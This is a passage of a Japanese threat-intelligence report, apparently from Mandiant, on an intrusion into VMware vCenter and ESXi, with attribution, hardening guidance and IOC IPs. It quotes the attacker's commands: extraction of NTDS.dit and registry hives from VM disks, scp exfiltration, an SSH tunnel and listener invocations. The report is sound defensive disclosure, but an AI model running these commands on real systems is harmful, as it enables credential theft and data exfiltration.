baseline;\">svr_auth_password</code><span style=\"vertical-align: baseline;\"> は、クライアント パスワードの最初の 14 バイトの SHA-256 ダイジェストがハードコードされた SHA-256 ハッシュと一致した場合に </span><code style=\"vertical-align: baseline;\">/etc/shadow</code><span style=\"vertical-align: baseline;\"> 検証をバイパスしてアクセスを許可し、同時にプレーンテキストの認証情報をログに記録するようにバックドア加工されていました。さらに、内部バージョン文字列およびセッション識別文字列は「</span><code style=\"vertical-align: baseline;\">23345</code><span style=\"vertical-align: baseline;\">」および「</span><code style=\"vertical-align: baseline;\">SSH-2.0-pulsesecure_23345</code><span style=\"vertical-align: baseline;\">」に変更されていました。この SSH バナーを手がかりに調査した結果、非標準の高位 TCP ポートで </span><code style=\"vertical-align: baseline;\">SSH-2.0-pulsesecure_23345</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">を公開している、侵害されたサードパーティ製のファイアウォールやルーターで構成された難読化ネットワークの疑いがあるインフラが特定されました。</span></p>\n<p><span style=\"vertical-align: baseline;\">ARMORY CASTLE は Linux アプライアンスから BEARBONES を数回実行し、最初は TCP ポート </span><code style=\"vertical-align: baseline;\">53</code><span style=\"vertical-align: baseline;\"> 上で、後に TCP ポート </span><code style=\"vertical-align: baseline;\">33992</code><span style=\"vertical-align: baseline;\"> 上でリスニング ネットワーク接続を開こうとしました。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>/tmp/dbr -R -p 53\n/tmp/dbr -R -p 33992</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">図 12: BEARBONES コマンドライン実行</span></p>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"> </span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">TCP ポート 33992 上でリスナーを作成するために BEARBONES を実行した後、ARMORY CASTLE は Administrator として vCenter アプライアンスに横移動し、</span><code style=\"vertical-align: baseline;\">sps-&lt;REDACTED&gt;@vsphere.local</code><span style=\"vertical-align: baseline;\"> という名前のローカル管理者アカウントを作成しました。特に、ARMORY CASTLE は </span><code style=\"vertical-align: baseline;\">/rest/appliance/access/ssh</code><span style=\"vertical-align: baseline;\"> への PUT リクエストを介して vCenter Server Appliance Management Interface（VAMI）API 経由で SSH を有効化しました。Mandiant は、中国との関連が疑われる脅威アクター UNC6201 による BRICKSTORM 侵入事案でも、この TTP が使用されているのを確認しています。SSH を有効にした後、ARMORY CASTLE は新しく作成したローカル管理者アカウントを使用して SSH 経由で vCenter に接続しました。</span></p>\n<p><span style=\"vertical-align: baseline;\">その後、ARMORY CASTLE は認証情報の窃取を実施し、SSH 経由で vCenter 内部マスター暗号化キー ファイルおよび Postgres パスワード ファイルを標的にしました。ARMORY CASTLE は、vCenter マスター対称キーおよび PostgreSQL データベース認証情報を抽出した直後に、VAMI API 経由で SSH サービスを無効にしました。その後、ARMORY CASTLE は </span><code style=\"vertical-align: baseline;\">vpxuser</code><span style=\"vertical-align: baseline;\"> アカウントを使用して ESXi Host Client（「ESXUI」）に認証し、root アカウントを使用して SSH 経由でも接続したことが観察されました。</span></p>\n<h4><span style=\"vertical-align: baseline;\">目的の達成</span></h4>\n<p><span style=\"vertical-align: baseline;\">ARMORY CASTLE は WinSCP クライアントを使用して ESXi ファイルシステム、接続されたディスク、マウントされた Virtual Machine File System（VMFS）ボリュームを列挙し、root アカウントの authorized_keys に SSH パブリック キーを追加しました。ARMORY CASTLE は root アカウントを使用して ESXi ファイルシステム上でさらなる偵察とデータ窃取を実施しました。攻撃者は主にディレクトリおよび VMFS ボリュームの列挙を行っているのが観察されました。ESXi ファイルシステムからのデータのステージングおよび持ち出し（エクスフィルトレーション）の準備として、ARMORY CASTLE は VMFS ボリューム上に隠しディレクトリ </span><span style=\"vertical-align: baseline;\">.a</span><span style=\"vertical-align: baseline;\"> を作成し、</span><code style=\"vertical-align: baseline;\">scp -r -d -t \"/vmfs/volumes/&lt;volume&gt;/.a\"</code><span style=\"vertical-align: baseline;\"> を使用して ESXi への SCP 接続を確立しました。その後、ARMORY CASTLE は </span><code style=\"vertical-align: baseline;\">tar xzf vmfs-pydist.tar.gz</code><span style=\"vertical-align: baseline;\"> を使用して、VMware 専用と疑われるツールセットを ESXi ホスト上にステージングおよび展開しました。</span><span style=\"vertical-align: baseline;\">このアーカイブに含まれる Python ツールを使用して、ARMORY CASTLE はゲスト VM の偵察を実施し、NTDS.dit、SYSTEM および SECURITY レジストリ ハイブ、ならびに内部 DNS 設定を抽出しました。</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>python vmfs_browser.py -d \"/dev/disks/vml.&lt;REDACTED&gt;:1\" ls .\n\npython vmfs_browser.py -d \"/dev/disks/vml.&lt;REDACTED&gt;:1\" info \"&lt;REDACTED&gt;-flat.vmdk\"\n\npython vmfs_browser.py -d \"/dev/disks/vml.&lt;REDACTED&gt;:1\" ls \"&lt;REDACTED&gt;-flat.vmdk:part2\"\n\npython vmfs_browser.py -d \"/dev/disks/vml.&lt;REDACTED&gt;:1\" extract \"&lt;REDACTED&gt;-flat.vmdk:part4/Windows/NTDS\" ./NTDS\n\npython vmfs_browser.py -d \"/dev/disks/vml.&lt;REDACTED&gt;:1\" extract \"&lt;REDACTED&gt;-flat.vmdk:part4/Windows/System32/config/SYSTEM\" ./SYSTEM\n\npython vmfs_browser.py -d \"/dev/disks/vml.&lt;REDACTED&gt;:1\" extract \"&lt;REDACTED&gt;-flat.vmdk:part4/Windows/System32/config/SECURITY\" ./\n\npython vmfs_browser.py -d \"/dev/disks/vml.&lt;REDACTED&gt;:1\" extract \"&lt;REDACTED&gt;-flat.vmdk:part4/Windows/System32/dns\" ./</code></pre>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">図 13: ARMORY CASTLE によるゲスト VM の偵察</span></p>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"> </span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">その後、ARMORY CASTLE はカレント ディレクトリ内のすべてのファイルを </span><code style=\"vertical-align: baseline;\">o.tar.gz</code><span style=\"vertical-align: baseline;\"> という名前の tar ファイルにアーカイブし、</span><code style=\"vertical-align: baseline;\">scp -r -p -d -f \"o.tar.gz\"</code><span style=\"vertical-align: baseline;\"> を使用して ESXi ファイルシステムから持ち出しました。次に、ARMORY CASTLE は隠しディレクトリを削除しました。Linux アプライアンス上では、BEARBONES SSH リスナーに加えて、対応する OpenSSH RSA 秘密鍵を /tmp/123.key（ESXi の root の authorized_keys に追加した公開鍵に対応）に配置し、Linux アプライアンスから ESXi へパスワードなしでアウトバウンド SSH 認証できるようにしました。ARMORY CASTLE はこの SSH キーと Linux アプライアンス上の BEARBONES リスナーを利用して、ESXi ファイルシステムから Linux アプライアンスへ SCP を使用してファイルをコピーできるようにし、そこからステージングされ、最終的に BeyondTrust アプライアンスからの HTTP GET リクエストを介してダウンロードされました。その後、ARMORY CASTLE は BeyondTrust アプライアンスからデータを持ち出したと考えられています。</span></p>\n<pre class=\"language-markup\"><code>/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -i /tmp/123.key -o BatchM [TRUNCATED@128]</code></pre>\n<p style=\"text-align: center;\"><em><span style=\"vertical-align: baseline;\">図 14: ARMORY CASTLE SSH トンネル</span></em></p>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline; color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"> </span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">ARMORY CASTLE は、/tmp/123.key SSH 秘密鍵とともに、LAZYBONES（</span><code style=\"vertical-align: baseline;\">/usr/bin/vmtoolscs</code><span style=\"vertical-align: baseline;\">）として追跡されている Slack ベースのバックドアを追加の Linux アプライアンスに展開しました。ARMORY CASTLE は、50 分ごとに再起動するように設定された systemd サービス ファイルを使用して永続化を確立しました。LAZYBONES は Go 言語で記述された軽量バックドアであり、Slack を使用して HTTPS 経由でコマンドアンドコントロール（C2）通信を確立します。このマルウェアは、指定された Slack チャンネルの最新メッセージを定期的に確認してコマンドをチェックします。LAZYBONES は、コマンド実行やファイル転送などのコア バックドア機能をサポートしています。具体的には、このバリアントは Slack C2 メッセージを Base64 エンコードする前に AES-256-CTR で暗号化し、150 〜 450 秒のジッター（揺らぎ）間隔でポーリングを行い、コマンド実行、ファイル転送、ビーコン間隔調整のための 4 つのコマンド（</span><code style=\"vertical-align: baseline;\">cmd</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">upload</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">download</code><span style=\"vertical-align: baseline;\">、</span><code style=\"vertical-align: baseline;\">sleep</code><span style=\"vertical-align: baseline;\">）をサポートしています。Mandiant は、2025 年初頭に CVE-2025-22457 の悪用成功に続き、</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability\"><span style=\"text-decoration: underline; vertical-align: baseline;\">別のキャンペーン</span></a><span style=\"vertical-align: baseline;\"> で ARMORY CASTLE が LAZYBONES を展開しているのを確認しています。</span></p>\n<h3><strong style=\"vertical-align: baseline;\">帰属（アトリビューション）</strong></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG は、この活動を中国との関連が疑われる国家主導の諜報アクター ARMORY CASTLE（旧 UNC5221）によるものと帰属させています。</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-beyondtrust\"><span style=\"text-decoration: underline; vertical-align: baseline;\">以前のブログ</span></a><span style=\"vertical-align: baseline;\"> で指摘したように、このキャンペーン内で活用されたツールや TTP は、以前に観察された ARMORY CASTLE の活動と一致しており、LAZYBONES のケースでは以前観察された活動と直接重複しています。</span></p>\n<h3><strong style=\"vertical-align: baseline;\">見通しと影響</strong></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG と Mandiant は、2023 年以降、ARMORY CASTLE が初期アクセスのためにエッジおよびセキュリティ アプライアンスのゼロデイおよび n デイ脆弱性を悪用しているのを追跡してきましたが、BONESAW は侵害後のゼロデイ悪用の大幅な拡大を示しています。BeyondTrust および Linux アプライアンス上で機能するように設計されたマルウェアとともに、SAWSNAKE や vmfs_browser のような VMware 専用ツールを使用することは、複数の異なるアプライアンスを標的とするよう特別に作られた機能を含む多様なツールセットを表しており、それぞれの理解度の高さを示しています。単一の侵害の過程で 3 つの異なる専用マルウェア セットと 2 つのゼロデイ脆弱性を使用したことは、ARMORY CASTLE のオペレーションを支援する大きなリソースが存在することを示しています。また、優先度の高い標的を侵害するという脅威アクターの運用上のコミットメントの大きさも示しています。最後に、BONESAW のビルド時間がこの侵害での展開より 1 か月以上前であることは重要であり、より広範な攻撃活動のために開発された可能性が高いことを示唆しています。</span></p>\n<h3><strong style=\"vertical-align: baseline;\">修復およびハードニング（Remediation and Hardening）</strong></h3>\n<p><span style=\"vertical-align: baseline;\">ARMORY CASTLE による </span><a href=\"https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/39495\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CVE-2026-123890</span></a><span style=\"vertical-align: baseline;\"> の悪用は、重要な現実を浮き彫りにしています。それは、VMware vCenter などの仮想化インフラストラクチャが、高度な持続的脅威（APT）にとって引き続き主な標的であり続けているということです。vCenter は仮想化データセンターの集中制御プレーンとして機能するため、保護において事後対応的なパッチ適用のみに依存することは不十分です。組織は、現在および未発見のゼロデイ脆弱性に対抗するため、インフラストラクチャのハードニングに対する予防的なゼロトラスト アプローチを採用する必要があります。</span></p>\n<p><span style=\"vertical-align: baseline;\">高度な持続的脅威（APT）から仮想化プラットフォームを保護するための包括的なフレームワークについては、Mandiant のガイド </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vsphere-brickstorm-defender-guide/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">vSphere and BRICKSTORM Malware: A Defender's Guide</span></a><span style=\"vertical-align: baseline;\"> を参照することを強く推奨します。このガイドでは、STIG ベンチマーク、Privileged Access Workstations（PAW）によるアイデンティティ管理、vCenter アプライアンスの予防的セキュリティ センサーへの変換を含む、インフラストラクチャ中心の防御戦略の詳細を説明しています。</span></p>\n<p><span style=\"vertical-align: baseline;\">脆弱性のあるシステムを保護するため、影響を受ける組織は Broadcom の公式</span><a href=\"https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/39495\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">パッチ</span></a><span style=\"vertical-align: baseline;\">を速やかに適用することを強く推奨します。</span></p>\n<p><strong style=\"vertical-align: baseline;\">デフォルト設定のリスク: VCSA ホストベース ファイアウォール</strong></p>\n<p><span style=\"vertical-align: baseline;\">vCenter 制御プレーンの防御における一般的な誤解は、Virtual Appliance Management Interface（VAMI）を介して管理されるネイティブの VCSA ホストベース ファイアウォールがラテラル ムーブメントに対して十分な保護を提供するというものです。実際には、このデフォルトの GUI ベースのファイアウォールに頼ることは、ARMORY CASTLE のような脅威アクターが悪用する深刻な運用上およびセキュリティ上の制限をもたらします:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">ポート固有の粒度の欠如:</strong><span style=\"vertical-align: baseline;\"> ネイティブの VAMI GUI には、ゼロトラスト モデルに必要な精度が欠けています。内部サーバー（バックアップ サーバーなど）に TCP 443 上の vSphere API への正当なアクセスを許可するために、管理者は多くの場合、すべてのポートに対してその IP を信頼することを余儀なくされます。その内部サーバーが侵害された場合、攻撃者は、SSH（22）や VAMI（5480）などの極めて機密性の高い管理インターフェースへ障壁なくアクセスできるようになってしまいます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">循環的な管理依存関係:</strong><span style=\"vertical-align: baseline;\"> VCSA ファイアウォールは、TCP ポート 5480 上に存在する VAMI を介して管理されます。ARMORY CASTLE が SSH を有効にするために実証したように、攻撃者が VAMI アクセスを獲得した場合、侵害されたロールを使用してファイアウォールを完全に無効化できます。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">フォレンジック視認性の欠如:</strong><span style=\"vertical-align: baseline;\"> VAMI ファイアウォールはセキュリティ監視ではなく接続管理用に設計されており、拒否された接続試行やシェル活動に関するリモート ログを生成しません。これにより、SOC チームが進行中のラテラル ムーブメントやポート スキャンを検知できなくなります。</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">インバウンド専用ポリシー:</strong><span style=\"vertical-align: baseline;\"> デフォルトの GUI はインバウンド トラフィックにのみ焦点を当てており、アウトバウンド（エグレス）ポリシーは未管理のままになります。これにより、侵害された VCSA 上のマルウェアが外部のコマンドアンドコントロール（C2）インフラストラクチャと自由に通信できるようになります。</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">VCSA Hardening Tool による予防的ハードニング</strong></p>\n<p><span style=\"vertical-align: baseline;\">高度なキャンペーンや将来のゼロデイから vCenter 制御プレーンを保護するため、Mandiant は </span><a href=\"https://github.com/mandiant/vcsa-hardening-tool\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">VCSA Hardening &amp; Logging Tool</span></a><span style=\"vertical-align: baseline;\"> の利用を推奨しています。</span></p>\n<p><span style=\"vertical-align: baseline;\">このスクリプトは、脆弱な VAMI GUI をバイパスし、</span><code style=\"vertical-align: baseline;\">iptables</code><span style=\"vertical-align: baseline;\"> を介して Photon Linux カーネル レベルで直接セキュリティ設定を適用します。アプライアンスを厳格な「Default Deny（デフォルト拒否）」の姿勢に移行させ、細粒度のエグレス フィルタリングを強制し、カーネル レベルのイベントをリモート SIEM にブリッジすることにより、このツールは VCSA を受動的なアプライアンスからアクティブなセキュリティ センサーへと変換します。</span></p>\n<p><span style=\"vertical-align: baseline;\">以下の表は、この予防的ハードニングスクリプトの導入により、複数の段階で ARMORY CASTLE の攻撃チェーンがどのように阻害されたかを示しており、ゼロデイ攻撃に対する有効性を実証しています。</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"> </div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">VCSA ハードニング機能</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">ARMORY CASTLE 攻撃チェーンへの影響</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">将来のゼロデイに対する保護</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">VCSA iptables インバウンド DROP ポリシーおよび接続ログ記録（管理ポート）</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">攻撃者の送信元 IP が信頼された許可リストに含まれていないため、TCP ポート 443、5480、22 を標的とした nmap スキャンはサイレントに破棄されます。ブロックされたこれらの接続試行は iptables-log-bridge.sh サービスを介して即座に SIEM に転送され、進行中のネットワーク偵察が明らかになります。</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">重要な管理インターフェースを内部のネットワーク マッピング ツールから隠蔽し、悪用が発生する前に進行中のラテラル ムーブメントに関する高精度な早期警戒アラートを提供します。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">VCSA iptables インバウンド DROP ポリシー (TCP 443)</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">BONESAW がポート 2012 経由で SAML キーを抽出したとしても、攻撃者は SAWSNAKE で偽造された管理者クッキーを利用することはできません。侵害された Linux アプライアンスが TRUSTED_WEB_IPS 配列に含まれていないため、ファイアウォールは vSphere Web Client/API（TCP 443）へのすべての接続を破棄します。</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">多層防御を提供: たとえゼロデイによってバックエンドサービス上での認証情報の窃取や認証バイパスが許可されたとしても、盗まれた認証情報/トークンを使用して信頼されていないネットワークから管理プレーンにアクセスすることはできません。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">VCSA iptables インバウンド DROP ポリシー (TCP 2010)</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">許可リストに登録されていない IP からの TCP 2012 に対する iptables DROP ポリシーにより、侵害された Linux アプライアンスから送信されるエクスプロイト ペイロードが </span><code style=\"vertical-align: baseline;\">vmdird</code><span style=\"vertical-align: baseline;\"> サービスに到達するのを防止します。</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">管理インターフェースおよび RPC サービスへの許可されていないインバウンド接続を破棄し、脆弱なサービスに対するネットワーク レベルの悪用を緩和します。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">VCSA iptables インバウンド DROP ポリシー（TCP 22 および 5480）</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">OS レベルのピボットをブロックします。ファイアウォールが SSH デーモンを有効化するための VAMI API（TCP 5480 または 443）への PUT リクエストを破棄します。さらに、SSH が既に有効化されていた場合でも、VCSA_SSH_RULES チェーンがすべての SSH 接続を破棄します。</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">基盤となる OS やデータベースを、直接的な認証情報窃取や改ざんから保護します。</span></p>\n<p><span style=\"vertical-align: baseline;\">攻撃者がウェブ アプリケーション内で管理者権限を取得した場合でも、root シェルへの移行はブロックされます。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">VCSA iptables エグレス DROP ポリシー</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">エグレス DROP ポリシーにより、scp データ持ち出しを防止し、LAZYBONES バックドアが外部 Slack エンドポイントとの HTTPS C2 通信を確立するのをブロックします。</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">許可されていないアウトバウンド インターネットおよび内部ネットワーク接続をブロックし、VCSA がピボット ポイントとして機能したり外部 C2 を確立したりするのを防ぎます。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">VCSA OS レベルのコマンドおよび Syslog 監査</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">リモート syslog 転送により、SSH 経由の tar および python vmfs_browser.py の実行をキャプチャし、NTDS.dit およびレジストリ ハイブの抽出をリアルタイムで露出させます。</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">bash コマンド実行および破棄されたネットワーク パケットを SIEM に転送し、ローカルのアンチフォレンジック（.bash_history の削除など）をバイパスして、非認可のシェル活動についてアラートを発信します。</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">VCSA カーネル レベルのルール強制</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">iptables</code><span style=\"vertical-align: baseline;\"> ルールは VAMI アプリケーションとは独立して動作するため、攻撃者が VAMI API（/rest/appliance/access/ssh）を使用してネットワーク セキュリティ コントロールを回避するのを防止します。</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">ネットワーク セキュリティを vCenter アプリケーション層から分離し、侵害された VAMI または vSphere 管理者認証情報を介してファイアウォール ポリシーが変更されないようにします。</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><em><span style=\"vertical-align: baseline;\">表 1: VCSA ハードニング機能</span></em></p></div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">侵害指標（IOC: Indicators of Compromise）</strong></h3>\n<p><span style=\"vertical-align: baseline;\">本ブログ記事で説明した活動のハンティングおよび特定においてコミュニティを支援するため、登録ユーザー向けに GTI Collection に侵害指標（IOC）を含めています。</span></p>\n<h3><span style=\"vertical-align: baseline;\">ネットワーク指標</span></h3>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">指標（Indicator）</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">説明</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">103.147.251.5</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">103.190.38.3</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">118.174.128.34</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">118.174.128.36</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">118.174.128.38</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">176.9.89.66</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">185.71.15.109</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">220.121.128.41</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">222.108.77.44</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">61.216.56.127</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">81.45.89.43</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">難読化ネットワーク（OBF）が疑われる IP</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p style=\"text-align: center;\"><span style=\"vertical-align: baseline;\">表 2: ネットワーク指標</span></p>\n<h3><span style=\"vertical-align: baseline;\">ファイル指標</span></h3>\n<div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: 